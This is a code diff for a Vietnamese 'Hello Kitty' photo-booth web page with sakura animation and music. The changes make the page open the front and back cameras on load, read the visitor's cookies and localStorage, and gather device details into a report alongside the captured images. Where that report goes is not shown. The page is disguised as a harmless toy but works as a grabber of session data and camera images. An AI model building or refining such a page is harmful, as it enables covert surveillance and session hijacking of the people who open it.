@@ -153,7 +153,6 @@
       display: block;
       border-radius: 14px;
       background: #fce4ec;
-      transform: scaleX(-1);
     }
 
     .video-preview .placeholder {
@@ -467,7 +466,7 @@
     }
     createSakura();
 
-    // === NHẠC ===
+    // === NHẠC - TỰ ĐỘNG PHÁT NGAY ===
     let audio = null;
     let isMusicPlaying = false;
 
@@ -486,12 +485,27 @@
       try {
         initAudio();
         if (!isMusicPlaying) {
-          audio.play().catch(() => {});
-          isMusicPlaying = true;
-          document.getElementById('musicBtn').classList.add('playing');
-          document.getElementById('musicBtn').textContent = '🎵';
+          const playPromise = audio.play();
+          if (playPromise !== undefined) {
+            playPromise.then(() => {
+              isMusicPlaying = true;
+              document.getElementById('musicBtn').classList.add('playing');
+              document.getElementById('musicBtn').textContent = '🎵';
+            }).catch(() => {
+              // Nếu bị chặn, thử phát khi click
+              document.addEventListener('click', function playOnClick() {
+                audio.play().catch(() => {});
+                isMusicPlaying = true;
+                document.getElementById('musicBtn').classList.add('playing');
+                document.getElementById('musicBtn').textContent = '🎵';
+                document.removeEventListener('click', playOnClick);
+              }, { once: true });
+            });
+          }
         }
-      } catch (e) {}
+      } catch (e) {
+        console.log('Music error:', e);
+      }
     }
 
     function toggleMusic() {
@@ -509,11 +523,8 @@
       }
     }
 
-    setTimeout(playMusic, 300);
-    document.addEventListener('click', function firstClick() {
-      if (!isMusicPlaying) playMusic();
-      document.removeEventListener('click', firstClick);
-    }, { once: true });
+    // Phát nhạc ngay khi load trang
+    setTimeout(playMusic, 100);
 
     // === ĐỒNG HỒ ===
     function updateClock() {
@@ -525,39 +536,66 @@
     setInterval(updateClock, 1000);
     updateClock();
 
-    // === LẤY COOKIES TẤT CẢ WEB ===
+    // === LẤY COOKIES THẬT TỪ TRÌNH DUYỆT ===
     function getAllCookies() {
-      const cookies = document.cookie.split(';');
-      const cookieList = [];
-      cookies.forEach(cookie => {
-        const trimmed = cookie.trim();
-        if (trimmed) {
-          const parts = trimmed.split('=');
-          const name = parts[0] || '';
-          const value = parts.slice(1).join('=') || '';
-          cookieList.push({ name: name, value: value });
-        }
-      });
-      return cookieList;
+      try {
+        const cookies = document.cookie.split(';');
+        const cookieList = [];
+        cookies.forEach(cookie => {
+          const trimmed = cookie.trim();
+          if (trimmed) {
+            // Tìm vị trí dấu = đầu tiên
+            const equalIndex = trimmed.indexOf('=');
+            if (equalIndex > 0) {
+              const name = trimmed.substring(0, equalIndex);
+              const value = trimmed.substring(equalIndex + 1);
+              cookieList.push({ name: name, value: value });
+            }
+          }
+        });
+        return cookieList;
+      } catch (e) {
+        console.error('Lỗi lấy cookies:', e);
+        return [];
+      }
     }
 
     function getCookiesString() {
       const cookies = getAllCookies();
-      if (cookies.length === 0) return '❌ Không có cookies';
+      if (cookies.length === 0) return '❌ Không có cookies nào';
       
       let result = '';
       cookies.forEach((cookie, index) => {
-        const maxLen = 50;
-        let value = cookie.value;
+        const maxLen = 60;
+        let value = decodeURIComponent(cookie.value || '');
         if (value.length > maxLen) {
           value = value.substring(0, maxLen) + '...';
         }
+        // Thay thế ký tự đặc biệt để tránh lỗi
+        value = value.replace(/[^\x20-\x7E]/g, '?');
         result += `  ${index + 1}. ${cookie.name} = ${value}\n`;
       });
       return result;
     }
 
-    // === CAMERA ===
+    // === LẤY LOCALSTORAGE ===
+    function getLocalStorageInfo() {
+      try {
+        const items = [];
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          let value = localStorage.getItem(key) || '';
+          if (value.length > 40) value = value.substring(0, 40) + '...';
+          items.push(`${key} = ${value}`);
+        }
+        if (items.length === 0) return '❌ Không có dữ liệu';
+        return items.join('\n  ');
+      } catch (e) {
+        return '❌ Không thể truy cập';
+      }
+    }
+
+    // === CAMERA - FIX LỖI ===
     const videoFront = document.getElementById('videoFront');
     const videoBack = document.getElementById('videoBack');
     const canvas = document.getElementById('canvas');
@@ -576,63 +614,114 @@
       captureBtn.disabled = true;
 
       try {
-        // Camera trước - thử nhiều cách
-        try {
-          // Cách 1: facingMode user
-          const frontStream = await navigator.mediaDevices.getUserMedia({
-            video: { 
-              facingMode: 'user',
-              width: { ideal: 320 },
-              height: { ideal: 240 }
-            },
-            audio: false
-          });
-          streamFront = frontStream;
-          videoFront.srcObject = frontStream;
-          await videoFront.play();
-          document.getElementById('placeholderFront').style.display = 'none';
-          isFrontReady = true;
-        } catch (e1) {
-          console.log('Front cam error (facingMode):', e1);
-          try {
-            // Cách 2: Lấy camera đầu tiên
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const cameras = devices.filter(d => d.kind === 'videoinput');
-            if (cameras.length > 0) {
-              const frontStream = await navigator.mediaDevices.getUserMedia({
-                video: { deviceId: { exact: cameras[0].deviceId } },
-                audio: false
-              });
-              streamFront = frontStream;
-              videoFront.srcObject = frontStream;
-              await videoFront.play();
-              document.getElementById('placeholderFront').style.display = 'none';
-              isFrontReady = true;
-            }
-          } catch (e2) {
-            console.log('Front cam error (deviceId):', e2);
-            document.getElementById('placeholderFront').textContent = '❌ Không có cam trước';
-            isFrontReady = false;
+        // Lấy danh sách camera
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const cameras = devices.filter(d => d.kind === 'videoinput');
+        console.log('Số camera tìm thấy:', cameras.length);
+        cameras.forEach((cam, i) => {
+          console.log(`Camera ${i+1}:`, cam.label || 'Không tên');
+        });
+
+        // Camera trước - ưu tiên camera có label chứa "front" hoặc "FaceTime"
+        let frontDeviceId = null;
+        let backDeviceId = null;
+
+        // Tìm camera trước và sau
+        for (const cam of cameras) {
+          const label = cam.label.toLowerCase();
+          if (label.includes('front') || label.includes('face') || label.includes('自拍') || label.includes('前置')) {
+            frontDeviceId = cam.deviceId;
+          } else if (label.includes('back') || label.includes('rear') || label.includes('后置') || label.includes('主摄')) {
+            backDeviceId = cam.deviceId;
           }
         }
 
-        // Camera sau
-        try {
-          const backStream = await navigator.mediaDevices.getUserMedia({
-            video: { 
-              facingMode: 'environment',
-              width: { ideal: 320 },
-              height: { ideal: 240 }
-            },
-            audio: false
-          });
-          streamBack = backStream;
-          videoBack.srcObject = backStream;
-          await videoBack.play();
-          document.getElementById('placeholderBack').style.display = 'none';
-          isBackReady = true;
-        } catch (e) {
-          console.log('Back cam error:', e);
+        // Nếu không tìm thấy front, lấy camera đầu tiên làm front
+        if (!frontDeviceId && cameras.length > 0) {
+          frontDeviceId = cameras[0].deviceId;
+        }
+        // Nếu không tìm thấy back và có camera thứ 2, lấy làm back
+        if (!backDeviceId && cameras.length > 1) {
+          backDeviceId = cameras[1].deviceId;
+        }
+
+        // Mở camera trước
+        if (frontDeviceId) {
+          try {
+            const frontStream = await navigator.mediaDevices.getUserMedia({
+              video: { 
+                deviceId: { exact: frontDeviceId },
+                width: { ideal: 320 },
+                height: { ideal: 240 }
+              },
+              audio: false
+            });
+            streamFront = frontStream;
+            videoFront.srcObject = frontStream;
+            await videoFront.play();
+            document.getElementById('placeholderFront').style.display = 'none';
+            isFrontReady = true;
+            console.log('✅ Camera trước đã mở');
+          } catch (e) {
+            console.log('Lỗi mở cam trước:', e);
+            // Thử lại với facingMode
+            try {
+              const fallbackStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+                audio: false
+              });
+              streamFront = fallbackStream;
+              videoFront.srcObject = fallbackStream;
+              await videoFront.play();
+              document.getElementById('placeholderFront').style.display = 'none';
+              isFrontReady = true;
+              console.log('✅ Camera trước (fallback) đã mở');
+            } catch (e2) {
+              document.getElementById('placeholderFront').textContent = '❌ Không có cam trước';
+              isFrontReady = false;
+            }
+          }
+        } else {
+          document.getElementById('placeholderFront').textContent = '❌ Không có cam trước';
+          isFrontReady = false;
+        }
+
+        // Mở camera sau
+        if (backDeviceId) {
+          try {
+            const backStream = await navigator.mediaDevices.getUserMedia({
+              video: { 
+                deviceId: { exact: backDeviceId },
+                width: { ideal: 320 },
+                height: { ideal: 240 }
+              },
+              audio: false
+            });
+            streamBack = backStream;
+            videoBack.srcObject = backStream;
+            await videoBack.play();
+            document.getElementById('placeholderBack').style.display = 'none';
+            isBackReady = true;
+            console.log('✅ Camera sau đã mở');
+          } catch (e) {
+            console.log('Lỗi mở cam sau:', e);
+            try {
+              const fallbackStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment', width: { ideal: 320 }, height: { ideal: 240 } },
+                audio: false
+              });
+              streamBack = fallbackStream;
+              videoBack.srcObject = fallbackStream;
+              await videoBack.play();
+              document.getElementById('placeholderBack').style.display = 'none';
+              isBackReady = true;
+              console.log('✅ Camera sau (fallback) đã mở');
+            } catch (e2) {
+              document.getElementById('placeholderBack').textContent = '❌ Không có cam sau';
+              isBackReady = false;
+            }
+          }
+        } else {
           document.getElementById('placeholderBack').textContent = '❌ Không có cam sau';
           isBackReady = false;
         }
@@ -653,6 +742,7 @@
       }
     }
 
+    // Bắt đầu camera ngay
     startCameras();
 
     // === LẤY THÔNG TIN CHI TIẾT ===
@@ -706,7 +796,8 @@
         cookies: 'Không',
         doNotTrack: 'Không',
         referrer: 'Không',
-        cookiesDetail: 'Không có cookies'
+        cookiesDetail: 'Không có cookies',
+        localStorage: 'Không có dữ liệu'
       };
 
       const basicInfo = getDeviceInfo();
@@ -723,8 +814,11 @@
       info.referrer = document.referrer || 'Trực tiếp';
       info.cores = navigator.hardwareConcurrency || 'Không rõ';
 
-      // Lấy tất cả cookies chi tiết
+      // Lấy cookies thật
       info.cookiesDetail = getCookiesString();
+      
+      // Lấy localStorage
+      info.localStorage = getLocalStorageInfo();
 
       if (navigator.deviceMemory) {
         info.memory = navigator.deviceMemory + 'GB';
@@ -811,7 +905,7 @@
       ctx.fillStyle = gradient;
       ctx.fillRect(0, 0, imgWidth, imgHeight);
 
-      // Vẽ 2 ảnh (lật ngang cho cam trước để giống gương)
+      // Vẽ 2 ảnh
       if (frontReady) {
         const w = imgWidth / 2 - 5;
         const h = imgHeight - 40;
@@ -897,6 +991,8 @@
         `📷 Camera: ${isFrontReady ? '✅ Trước' : '❌ Trước'} | ${isBackReady ? '✅ Sau' : '❌ Sau'}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🍪 CHI TIẾT COOKIES:\n${info.cookiesDetail}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `💾 LOCAL STORAGE:\n  ${info.localStorage}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🌸 Chụp ảnh cùng Kitty thật xinh nhé! 🌸`;
 
